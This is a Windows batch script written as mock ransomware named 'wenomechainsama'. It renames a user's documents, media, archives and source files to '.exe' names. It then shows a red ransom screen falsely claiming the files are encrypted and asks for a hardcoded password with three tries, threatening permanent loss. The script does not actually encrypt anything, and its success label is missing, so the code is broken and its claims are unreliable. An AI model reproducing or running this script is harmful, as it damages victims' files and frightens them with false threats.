@echo off

title wenomechainsama.exe

RENAME *.txt wenomechainsama encrypt(%RANDOM%).exe

RENAME *.docx wenomechainsama encrypt(%RANDOM%).exe

RENAME *.html wenomechainsama encrypt(%RANDOM%).exe

RENAME *.WAV wenomechainsama encrypt(%RANDOM%).exe

RENAME *.WMA wenomechainsama encrypt(%RANDOM%).exe

RENAME *.KBS wenomechainsama encrypt(%RANDOM%).exe

RENAME *.vbs wenomechainsama encrypt(%RANDOM%).exe

RENAME *.rar wenomechainsama encrypt(%RANDOM%).exe

RENAME *.zip wenomechainsama encrypt(%RANDOM%).exe

RENAME *.java wenomechainsama encrypt(%RANDOM%).exe

RENAME *.cpp wenomechainsama encrypt(%RANDOM%).exe

RENAME *.png wenomechainsama encrypt(%RANDOM%).exe

RENAME *.jpg wenomechainsama encrypt(%RANDOM%).exe

RENAME *.mp3 wenomechainsama encrypt(%RANDOM%).exe

color 4f

cls

ECHO -----------------------------------------------------You Have Been Encrypted With wenomechainsama!-------------------------------------------------------------

ECHO _______________________________________________________________________________________________________________________

ECHO _______________________________________________________________________________________________________________________

ECHO You can get your files back only if you have the password key:

ECHO Security key is impossible to crack however if you think you are too smart you have three chances to try.

ECHO After three wrong keys the decryptor will be removed from your pc!

ECHO

:yes

SET /P pass=Enter Password(3 chances left):

IF %pass%==@{[grogumasterkey]}@ goto cracked

IF NOT %pass%==@{[grogumasterkey]}@ goto incorrect1

:incorrect1

ECHO Incorrect password!

SET /P pass=Enter Password(2 chances left):

IF %pass%==@{[grogumasterkey]}@ goto cracked

IF NOT %pass%==@{[grogumasterkey]}@ goto incorrect2

PAUSE

EXIT

:incorrect2

ECHO Incorrect password!

SET /P pass=Enter Password(1 chance left):

IF %pass%==@{[grogumasterkey]}@ goto cracked

IF NOT %pass%==@{[grogumasterkey]}@ goto incorrect3

:incorrect3

echo your files are now locked forever

PAUSE

EXIT
